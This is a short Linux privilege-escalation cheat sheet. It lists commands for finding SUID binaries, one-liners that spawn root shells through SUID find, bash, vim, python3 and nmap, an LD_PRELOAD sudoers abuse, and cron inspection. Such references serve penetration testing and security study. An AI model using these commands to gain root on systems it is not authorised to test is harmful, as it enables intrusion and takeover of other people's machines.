---
title: Linux Privilege Escalation Reference
description: Common misconfigurations, SUID binaries, and escalation vectors in Linux environments.
---

Privilege escalation involves transitioning from a standard, unprivileged user account (`uid >= 1000`) to root authority (`uid=0`).

## 1. SUID / SGID Binary Enumeration

Files with the SetUID bit (`4000`) execute with the permissions of the file owner (typically root).

### Find All SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```

### High-Risk SUID Binaries (GTFOBins)
If any of the following standard utilities possess the SUID bit, an administrative shell can be obtained immediately:

| Utility | Exploitation Command |
| :--- | :--- |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `bash` | `bash -p` |
| `vim` | `vim -c ':!/bin/sh'` |
| `python3` | `python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'` |
| `nmap` (Legacy) | `nmap --interactive` followed by `!sh` |

## 2. Sudo Privileges & Permissions

Verify granted sudo permissions for the current user without a password prompt:
```bash
sudo -l
```

### Dangerous LD_PRELOAD Directive
If `env_keep += LD_PRELOAD` is set in `/etc/sudoers`:
```bash
# Compile malicious shared object and execute with sudo
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so <allowed-command>
```

## 3. Scheduled Tasks (Cron Jobs)

Inspect system crontabs and world-writable scripts:
```bash
cat /etc/crontab
ls -la /etc/cron.*
find /var/spool/cron/ -type f 2>/dev/null
```
